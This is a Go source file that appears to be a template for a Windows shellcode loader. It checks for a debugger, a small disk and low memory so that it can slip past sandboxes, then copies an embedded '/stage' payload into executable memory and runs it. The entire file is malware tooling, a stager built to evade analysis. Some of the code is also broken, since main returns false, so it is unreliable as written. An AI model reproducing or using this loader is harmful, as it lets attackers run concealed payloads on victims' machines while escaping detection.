package main

import (
	"syscall"
	"unsafe"

	statik "./statik"
	"./fs"
)

func main() {

	type MEMORYSTATUSEX struct {
		dwLength                uint32
		dwMemoryLoad            uint32
		ullTotalPhys            uint64
		ullAvailPhys            uint64
		ullTotalPageFile        uint64
		ullAvailPageFile        uint64
		ullTotalVirtual         uint64
		ullAvailVirtual         uint64
		ullAvailExtendedVirtual uint64
	}

	var kernel32, _ = syscall.LoadLibrary("kernel32.dll")
	var globalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	var getDiskFreeSpaceEx = kernel32.NewProc("GetDiskFreeSpaceExW")
	var IsDebuggerPresent, _ = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")

	// Check debugger
	var nargs uintptr = 0
	debuggerPresent, _, _ := syscall.Syscall(uintptr(IsDebuggerPresent), nargs, 0, 0, 0)
	if debuggerPresent != 0 {
		return false
	}

	// Check freee disks space (50G min)
	lpFreeBytesAvailable := int64(0)
	lpTotalNumberOfBytes := int64(0)
	lpTotalNumberOfFreeBytes := int64(0)

	getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))
	diskSizeGB := float32(lpTotalNumberOfBytes) / 1073741824
	if diskSizeGB < float32(50.0) {
		return false
	}

	// Check memory
	var memInfo MEMORYSTATUSEX
	memInfo.dwLength = uint32(unsafe.Sizeof(memInfo))
	globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if memInfo.ullTotalPhys/1073741824 < 1 {
		return false
	}

	// Detect sleep acceleration
	// Check CPU cores
	
	statik.{{statik}}()

	VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
	memcpy := syscall.MustLoadDLL("msvcrt.dll").MustFindProc("memcpy")
	statikFS, _ := fs.New()
	data, _ := fs.ReadFile(statikFS, "/stage")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(data)), 0x1000|0x2000, 0x40)
	_, _, _ = memcpy.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}